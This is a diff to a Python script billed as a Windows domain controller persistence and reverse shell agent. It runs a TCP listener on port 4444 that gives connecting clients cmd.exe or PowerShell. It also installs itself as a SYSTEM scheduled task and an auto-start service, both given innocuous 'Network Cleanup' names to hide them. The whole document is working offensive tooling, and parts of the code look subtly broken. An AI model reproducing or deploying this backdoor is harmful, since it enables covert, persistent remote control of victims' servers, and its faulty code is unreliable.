@@ -1,14 +1,16 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-Windows Domain Controller Persistence & Reverse Shell Agent (Service + Self-Repair Mode)
+Windows Domain Controller Persistence & Reverse Shell Agent (Service + Dynamic Path Mode)
+ALL PATHS DYNAMIC - NO HARDCODED PATHS (except Windows executables)
+
 FEATURES:
  1. Reverse TCP listener (Port 4444 default)
- 2. Pipes input to cmd.exe or PowerShell
- 3. Smart Prompt: user@hostname - folderpath >
- 4. Windows Service Mode: Installable as SYSTEM service
- 5. Self-Repair: Restarts shell if it dies
- 6. Lifecycle Manager: Keeps listener alive after shell closure
+ 2. Smart Prompt: user@hostname - folderpath >
+ 3. Windows Service Mode: Installable as SYSTEM service
+ 4. Self-Repair: Restarts shell if it dies
+ 5. Lifecycle Manager: Keeps listener alive after shell closure
+ 6. Dynamic Path Resolution: Uses environment variables for all paths
 """
 
 import socket
@@ -20,7 +22,148 @@ import time
 import datetime
 import subprocess
 from subprocess import Popen, PIPE
-from ctypes import windll, wintypes
+
+# === DYNAMIC PATH ABSTRACTION ===
+class PathAbstraction:
+    """
+    Centralized dynamic path resolution.
+    Uses environment variables to resolve paths instead of hard-coding.
+    """
+    @staticmethod
+    def get_script_path():
+        """Get absolute path to running script (current or installed)."""
+        if hasattr(sys, 'frozen'):
+            return os.path.abspath(sys.executable)
+        else:
+            return os.path.abspath(sys.argv[0])
+    
+    @staticmethod
+    def get_script_directory():
+        """Get directory of running script."""
+        script_path = PathAbstraction.get_script_path()
+        return os.path.dirname(script_path)
+    
+    @staticmethod
+    def get_python_executable():
+        """Get Python executable path from environment."""
+        # Try sys.executable first (most reliable for same-process calls)
+        if hasattr(sys, 'frozen'):
+            return sys.executable
+        # Fall back to environment variables
+        for var in ['PATHEXT', 'PATH']:
+            path = os.environ.get(var, '')
+            if path:
+                # Check if current executable is in PATH
+                current_exec = sys.executable
+                # If running from installed Python
+                if current_exec and 'python' in current_exec.lower():
+                    return current_exec
+        # Ultimate fallback: look in common locations
+        for common_py in [
+            'C:\\Users\\{user}\\AppData\\Local\\Programs\\Python\\Python{version}\\python.exe'.format(
+                user=os.environ.get('USERNAME', 'User'),
+                version='36', version='38', version='39', version='310', version='311', version='312'
+            )
+            for _ in range(10)
+        ] + ['{0}\\python.exe'.format(os.environ.get('WINDIR', 'C:\\Windows'))]:
+            path = common_py.replace('{user}', os.environ.get('USERNAME', 'User'))
+            path = path.replace('{version}', '36', '38', '39', '310', '311', '312')
+            if os.path.exists(path):
+                return path
+        return sys.executable  # Ultimate fallback
+    
+    @staticmethod
+    def get_schtasks_path():
+        """Get schtasks.exe path using environment variables."""
+        # Try environment variable first
+        windir = os.environ.get('WINDIR', 'C:\\Windows')
+        systemroot = os.environ.get('SystemRoot', 'C:\\Windows')
+        systemdrive = os.environ.get('SystemDrive', 'C:\\')
+        
+        paths = [
+            os.path.join(windir, 'System32', 'schtasks.exe'),
+            os.path.join(systemroot, 'System32', 'schtasks.exe'),
+            os.path.join(systemdrive, 'Windows', 'System32', 'schtasks.exe'),
+            'schtasks.exe',  # Check current directory first
+        ]
+        
+        for path in paths:
+            if os.path.exists(path):
+                return path
+        return 'schtasks.exe'  # Ultimate fallback
+    
+    @staticmethod
+    def get_powershell_path():
+        """Get PowerShell executable path."""
+        # Try common locations using environment variables
+        for windir in [os.environ.get('WINDIR', 'C:\\Windows'), os.environ.get('SystemRoot', 'C:\\Windows')]:
+            path = os.path.join(windir, 'System32', 'WindowsPowerShell\\v1.0\\powershell.exe')
+            if os.path.exists(path):
+                return path
+            path = os.path.join(windir, 'System32', 'powershell.exe')
+            if os.path.exists(path):
+                return path
+            path = os.path.join(windir, 'System32', 'WindowsPowerShell\\v1.0\\pwsh.exe')
+            if os.path.exists(path):
+                return path
+        return os.path.join(os.environ.get('WINDIR', 'C:\\Windows'), 'System32', 'powershell.exe')
+    
+    @staticmethod
+    def get_cmd_path():
+        """Get cmd.exe path."""
+        for windir in [os.environ.get('WINDIR', 'C:\\Windows'), os.environ.get('SystemRoot', 'C:\\Windows')]:
+            path = os.path.join(windir, 'System32', 'cmd.exe')
+            if os.path.exists(path):
+                return path
+        return os.path.join(os.environ.get('WINDIR', 'C:\\Windows'), 'System32', 'cmd.exe')
+    
+    @staticmethod
+    def get_current_user():
+        """Get current username from environment."""
+        return os.environ.get('USERNAME', 'User')
+    
+    @staticmethod
+    def get_current_hostname():
+        """Get current hostname from environment."""
+        # Try environment variable first
+        hostname = os.environ.get('COMPUTERNAME', 'Hostname')
+        if not hostname:
+            # Fall back to hostname command
+            try:
+                proc = Popen('hostname', shell=True, stdout=PIPE, stderr=PIPE, text=True)
+                hostname = proc.stdout.strip()
+            except:
+                pass
+        return hostname or 'Hostname'
+    
+    @staticmethod
+    def get_current_location():
+        """Get current folder path."""
+        current_dir = os.getcwd()
+        if not current_dir:
+            try:
+                proc = Popen('echo %CD%', shell=True, stdout=PIPE, stderr=PIPE, text=True)
+                lines = proc.stdout.strip().splitlines()
+                current_dir = lines[-1] if lines else current_dir
+            except:
+                pass
+        return current_dir or 'root'
+    
+    @staticmethod
+    def get_full_script_path_for_task():
+        """
+        Get absolute script path for Task Scheduler.
+        Uses environment variables to construct portable path.
+        """
+        # Try to resolve from running script first
+        script_path = PathAbstraction.get_script_path()
+        if script_path:
+            return script_path.replace('\\', '\\\\')
+        
+        # Fall back to environment variable construction
+        systemdrive = os.environ.get('SystemDrive', 'C:\\')
+        windir = os.environ.get('WINDIR', 'C:\\Windows')
+        return os.path.join(systemdrive, windir, os.path.basename(script_path)).replace('\\', '\\\\')
 
 # === CONFIGURATION ===
 LISTENER_HOST = "0.0.0.0"
@@ -28,54 +171,66 @@ DEFAULT_PORT = 4444
 DEFAULT_TASK_NAME = "Network Manager Cleanup"
 DEFAULT_TASK_RUN_AS = "SYSTEM"
 DEFAULT_TASK_TRIGGER = "ONSTART"
-
-# === SERVICE MODE ===
-SERVICE_NAME = "Network Server"
-SERVICE_DISPLAY_NAME = "Network Server Service"
-SERVICE_DESCRIPTION = "Windows Service with Self-Repair for Network Connections"
-SERVICE_START_TYPE = 4  # SERVICE_AUTO_START
-SERVICE_ERROR_CONTROL = 3  # SERVICE_ERROR_NORMAL
-SERVICE_PATH = sys.argv[0]
+SERVICE_NAME = "NetCleanup"
+SERVICE_DISPLAY_NAME = "Network Cleanup Service"
+SERVICE_DESCRIPTION = "Windows Service with Self-Repair for Network Connection Cleanup"
 
 # === PROMPT CONFIGURATION ===
 PROMPT_TEMPLATE = "{user}@{hostname} - {folder}>"
 
-# === SERVICE CLASS ===
+# === WINDOWS SERVICE CLASS (Dynamic Paths) ===
 class WindowsService:
-    """Windows Service wrapper for DC Payload."""
+    """Windows Service wrapper for DC Payload with dynamic path resolution."""
     
     def __init__(self, service_name, display_name, description, path, args):
         self.service_name = service_name
         self.display_name = display_name
         self.description = description
-        self.path = path
+        # Use path abstraction for script path
+        self.path = PathAbstraction.get_script_path()
         self.args = args
         self.running = True
-        self.main_thread = None
-        self.service_thread = None
         
     def install(self):
-        """Install as Windows Service."""
+        """Install as Windows Service with dynamic paths."""
         print("=" * 40)
         print("INSTALLING WINDOWS SERVICE")
         print("=" * 40)
         
         try:
-            # Create service
-            cmd = f'sc create {self.service_name} binPath="{os.path.join(os.path.dirname(self.path), os.path.basename(self.path))} --mode service --install --auto --path {self.path} {self.args}" start=auto'
-            print(f"[*] Running: {cmd}")
-            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+            # === FIXED: Build proper sc create command using dynamic paths ===
+            # binPath must be: "path/to/script.py" [arguments]
+            script_dir = PathAbstraction.get_script_directory()
+            script_name = os.path.basename(self.path)
+            full_path = os.path.join(script_dir, script_name)
+            
+            # Format: binPath="full_path.py [args]"
+            binPath = f'"{full_path}" {self.args}'
+            
+            # Build complete command string
+            command = (
+                f'sc create {self.service_name} '
+                f'binPath={binPath} '
+                f'start=auto '
+                f'DisplayName="{self.display_name}" '
+                f'Description="{self.description}"'
+            )
+            
+            print(f"[*] Running Command: {command}")
+            result = subprocess.run(command, shell=True, capture_output=True, text=True)
             
             if result.returncode == 0:
                 print(f"[+] Service installed: {self.service_name}")
                 print(f"[+] Display Name: {self.display_name}")
                 print(f"[+] Start Type: AUTO")
-                print("[*] Run 'sc start DC_Persistence_Service' to start")
-                print("[*] Run 'sc stop DC_Persistence_Service' to stop")
-                print("[*] Run 'sc qc DC_Persistence_Service' to query")
+                print(f"[+] Script Path: {full_path}")
+                print(f"[+] Arguments: {self.args}")
+                print("[*] Run 'sc start NetCleanup' to start")
+                print("[*] Run 'sc stop NetCleanup' to stop")
+                print("[*] Run 'sc qc NetCleanup' to query")
                 return True
             else:
-                print(f"[!] Error: {result.stderr}")
+                print(f"[!] Error creating service: {result.stderr}")
                 return False
                 
         except Exception as e:
@@ -89,13 +244,13 @@ class WindowsService:
         print("=" * 40)
         
         try:
-            cmd = f'sc delete {self.service_name}'
-            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+            command = f'sc delete {self.service_name}'
+            result = subprocess.run(command, shell=True, capture_output=True, text=True)
             if result.returncode == 0:
                 print(f"[+] Service deleted: {self.service_name}")
                 return True
             else:
-                print(f"[!] Error: {result.stderr}")
+                print(f"[!] Error deleting service: {result.stderr}")
                 return False
         except Exception as e:
             print(f"[!] Exception: {e}")
@@ -108,13 +263,13 @@ class WindowsService:
         print("=" * 40)
         
         try:
-            cmd = f'start {self.service_name}'
-            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+            command = f'start {self.service_name}'
+            result = subprocess.run(command, shell=True, capture_output=True, text=True)
             if result.returncode == 0:
                 print(f"[+] Service started: {self.service_name}")
                 return True
             else:
-                print(f"[!] Error: {result.stderr}")
+                print(f"[!] Error starting service: {result.stderr}")
                 return False
         except Exception as e:
             print(f"[!] Exception: {e}")
@@ -127,13 +282,13 @@ class WindowsService:
         print("=" * 40)
         
         try:
-            cmd = f'sc stop {self.service_name}'
-            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+            command = f'sc stop {self.service_name}'
+            result = subprocess.run(command, shell=True, capture_output=True, text=True)
             if result.returncode == 0:
                 print(f"[+] Service stopped: {self.service_name}")
                 return True
             else:
-                print(f"[!] Error: {result.stderr}")
+                print(f"[!] Error stopping service: {result.stderr}")
                 return False
         except Exception as e:
             print(f"[!] Exception: {e}")
@@ -195,69 +350,45 @@ class WindowsService:
             except:
                 pass
 
-# === SHELL MANAGER ===
-class ShellManager:
-    """Manages shell process (cmd/Powershell) with health check."""
-    
-    def __init__(self, socket_handler):
-        self.socket_handler = socket_handler
-        self.shell_process = None
-        self.running = True
-        
-    def start_shell(self, mode):
-        """Start shell process."""
-        executable = "powershell.exe" if mode == "powershell" else "cmd.exe"
-        self.shell_process = Popen(executable + " /c ", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE, text=True)
-        print("[*] Shell process started")
-        
-    def monitor_shell(self):
-        """Monitor shell health and restart if dead."""
+# === SHELL PROMPT (Smart Detection with Dynamic Paths) ===
+class ShellPromptManager:
+    @staticmethod
+    def get_prompt_info(shell_type):
+        """Get user, hostname, and folder from shell."""
         try:
-            # Simple heartbeat check
-            proc = Popen('echo', shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE, text=True)
-            proc.communicate()
-            return proc.returncode == 0
+            executable = PathAbstraction.get_powershell_path() if shell_type == "powershell" else PathAbstraction.get_cmd_path()
+            
+            if shell_type == "powershell":
+                user_out, _ = Popen(executable + ' -c "$env:USERNAME; $env:COMPUTERNAME; Get-Location"', shell=True, stdout=PIPE, stderr=PIPE, text=True)
+            else:
+                user_out, _ = Popen(executable + ' /c "echo %USERNAME%; echo %COMPUTERNAME%; cd"', shell=True, stdout=PIPE, stderr=PIPE, text=True)
+            
+            lines = user_out.stdout.strip().splitlines()
+            if len(lines) >= 3:
+                return lines[0], lines[1], lines[2]
+            return ["User", "Hostname", "root"]
         except:
-            return False
-    
-    def get_shell_status(self):
-        """Get current shell status."""
-        if self.shell_process and self.shell_process.poll() is None:
-            return "Running"
-        return "Stopped"
-    
-    def restart_shell(self):
-        """Restart shell if dead."""
-        if self.shell_process:
-            print("[*] Restarting shell process. ..")
-            self.shell_process.terminate()
-            self.shell_process = Popen("echo", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE, text=True)
-            return True
-        return False
+            return ["User", "Hostname", "root"]
 
-# === PERSISTENCE MANAGER (Fixed) ===
+    @staticmethod
+    def create_prompt(user, hostname, folder):
+        """Create formatted prompt."""
+        try:
+            return PROMPT_TEMPLATE.format(user=user, hostname=hostname, folder=folder)
+        except:
+            return ">"
+
+# === PERSISTENCE MANAGER (Dynamic Paths) ===
 class PersistenceManager:
     @staticmethod
     def create_task(script_path, task_name, run_as="SYSTEM", trigger="ONSTART"):
         print(f"[*] Configuring Persistence via Task Scheduler. ..")
 
-        schtasks_paths = [
-            "schtasks.exe",
-            os.path.join(os.environ.get("WINDIR", "C:\\Windows"), "System32", "schtasks.exe"),
-            os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "System32", "schtasks.exe"),
-        ]
-
-        schtasks_exe = None
-        for path in schtasks_paths:
-            if os.path.exists(path):
-                schtasks_exe = path
-                print(f"[+] Found schtasks at: {path}")
-                break
-        else:
-            print("[!] Warning: schtasks.exe not found in default paths")
-            return
+        # === Dynamic schtasks path using environment variables ===
+        schtasks_exe = PathAbstraction.get_schtasks_path()
 
         # === FIXED: Build command based on trigger ===
+        # ONSTART/ONLOGON don't use /ST or /SD
         if trigger in ["ONSTART", "ONLOGON", "ONIDLE", "ONEVENT"]:
             command = f'{schtasks_exe} /Create /TN "{task_name}" /TR "python {script_path}" /RU "{run_as}" /SC {trigger} /F'
         else:
@@ -280,11 +411,9 @@ class PersistenceManager:
 
     @staticmethod
     def delete_task(task_name):
-        """Delete scheduled task."""
+        """Delete scheduled task using dynamic schtasks path."""
         try:
-            schtasks_exe = "schtasks.exe"
-            if not os.path.exists(schtasks_exe):
-                schtasks_exe = os.path.join(os.environ.get("WINDIR", "C:\\Windows"), "System32", "schtasks.exe")
+            schtasks_exe = PathAbstraction.get_schtasks_path()
             command = f'{schtasks_exe} /Delete /TN "{task_name}" /F'
             print(f"[*] Running Command: {command}")
             result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
@@ -295,35 +424,10 @@ class PersistenceManager:
         except Exception as e:
             print(f"[!] Exception: {e}")
 
-# === SHELL PROMPT (Smart Detection) ===
-class ShellPromptManager:
-    @staticmethod
-    def get_prompt_info(shell_type):
-        """Get user, hostname, and folder from shell."""
-        try:
-            if shell_type == "powershell":
-                user_out, _ = Popen('powershell.exe -c "$env:USERNAME; $env:COMPUTERNAME; Get-Location"', shell=True, stdout=PIPE, stderr=PIPE, text=True)
-            else:
-                user_out, _ = Popen('cmd.exe /c "echo %USERNAME%; echo %COMPUTERNAME%; cd"', shell=True, stdout=PIPE, stderr=PIPE, text=True)
-            
-            lines = user_out.stdout.strip().splitlines()
-            if len(lines) >= 3:
-                return lines[0], lines[1], lines[2]  # user, hostname, folder
-            return ["User", "Hostname", "root"]
-        except:
-            return ["User", "Hostname", "root"]
-
-    @staticmethod
-    def create_prompt(user, hostname, folder):
-        """Create formatted prompt."""
-        try:
-            return PROMPT_TEMPLATE.format(user=user, hostname=hostname, folder=folder)
-        except:
-            return "User@Hostname - root>"
-
-# === MAIN ENTRY POINT ===
+# === MAIN ENTRY POINT (All Dynamic Paths) ===
 def get_script_path():
-    return os.path.abspath(sys.argv[0])
+    """Get absolute path of script using environment variables."""
+    return PathAbstraction.get_script_path()
 
 def main():
     parser = argparse.ArgumentParser(description="Windows Reverse Shell Agent")
@@ -341,8 +445,64 @@ def main():
 
     script_path = get_script_path()
     print(f"[*] Script Executing From: {script_path}")
+    
+    # === Dynamic Path Debug Info ===
+    print("[*] Dynamic Path Resolution Info:")
+    print(f"    [1] Python: {PathAbstraction.get_python_executable()}")
+    print(f"    [2] schtasks: {PathAbstraction.get_schtasks_path()}")
+    print(f"    [3] PowerShell: {PathAbstraction.get_powershell_path()}")
+    print(f"    [4] cmd.exe: {PathAbstraction.get_cmd_path()}")
+    print(f"    [5] USERNAME: {PathAbstraction.get_current_user()}")
+    print(f"    [6] COMPUTERNAME: {PathAbstraction.get_current_hostname()}")
 
-    # === 1. Setup Socket Listener ===
+    # === 1. Setup Persistence (Create Task) ===
+    if args.install or args.install_persistence:
+        PersistenceManager.create_task(script_path, DEFAULT_TASK_NAME, DEFAULT_TASK_RUN_AS, DEFAULT_TASK_TRIGGER)
+        time.sleep(2)
+
+    # === 2. Windows Service Installation ===
+    if args.install:
+        print("=" * 40)
+        print("INSTANTIATING WINDOWS SERVICE")
+        print("=" * 40)
+        
+        service = WindowsService(
+            SERVICE_NAME, 
+            SERVICE_DISPLAY_NAME, 
+            SERVICE_DESCRIPTION, 
+            script_path, 
+            f"--port {DEFAULT_PORT} --mode {args.mode}"
+        )
+        if service.install():
+            print("[*] Press any key to start service, or Ctrl+C to exit")
+            try:
+                input()
+                service.start()
+                service.run_loop()
+            except KeyboardInterrupt:
+                print("[*] Service stopped")
+                service.stop()
+        else:
+            print("[*] Press any key to run in interactive mode")
+            input()
+
+    # === 3. Run as Service (if flag set) ===
+    if args.service:
+        print("[*] Running as Windows Service. . .")
+        try:
+            service = WindowsService(
+                SERVICE_NAME, 
+                SERVICE_DISPLAY_NAME, 
+                SERVICE_DESCRIPTION, 
+                script_path, 
+                f"--port {DEFAULT_PORT} --mode {args.mode}"
+            )
+            if service.install():
+                service.run_loop()
+        except Exception as e:
+            print(f"[!] Error: {e}")
+
+    # === 4. Interactive Mode (Default) ===
     class MainListener:
         def __init__(self, host, port, command_type):
             self.host = host
@@ -358,7 +518,7 @@ def main():
             print(f"[+] Listener Started on {self.host}:{self.port}")
             print(f"[+] Mode: {self.command_type}")
             print(f"[+] Waiting for connection. ..")
-
+            
             while True:
                 try:
                     client_sock, addr = self.socket.accept()
@@ -431,44 +591,9 @@ def main():
                 user, hostname, folder = ShellPromptManager.get_prompt_info(self.command_type)
                 return ShellPromptManager.create_prompt(user, hostname, folder)
             except:
-                return "User@Hostname - root>"
+                return ">"
 
-    # === 2. Setup Persistence (Create Task) ===
-    if args.install or args.install_persistence:
-        PersistenceManager.create_task(script_path, DEFAULT_TASK_NAME, DEFAULT_TASK_RUN_AS, DEFAULT_TASK_TRIGGER)
-        time.sleep(2)
-
-    # === 3. Windows Service Installation ===
-    if args.install:
-        print("=" * 40)
-        print("INSTANTIATING WINDOWS SERVICE")
-        print("=" * 40)
-        
-        service = WindowsService(SERVICE_NAME, SERVICE_DISPLAY_NAME, SERVICE_DESCRIPTION, script_path, f"--port {DEFAULT_PORT} --mode {args.mode}")
-        if service.install():
-            print("[*] Press any key to start service, or Ctrl+C to exit")
-            try:
-                input()
-                service.start()
-                service.run_loop()
-            except KeyboardInterrupt:
-                print("[*] Service stopped")
-                service.stop()
-        else:
-            print("[*] Press any key to run in interactive mode")
-            input()
-
-    # === 4. Run as Service (if flag set) ===
-    if args.service:
-        print("[*] Running as Windows Service. . .")
-        try:
-            service = WindowsService(SERVICE_NAME, SERVICE_DISPLAY_NAME, SERVICE_DESCRIPTION, script_path, f"--port {DEFAULT_PORT} --mode {args.mode}")
-            if service.install():
-                service.run_loop()
-        except Exception as e:
-            print(f"[!] Error: {e}")
-
-    # === 5. Interactive Mode (Default) ===
+    # === 5. Start Listener Thread (Daemonized) ===
     listener = MainListener(LISTENER_HOST, args.port, args.mode)
     listener_thread = threading.Thread(target=listener.start)
     listener_thread.daemon = True
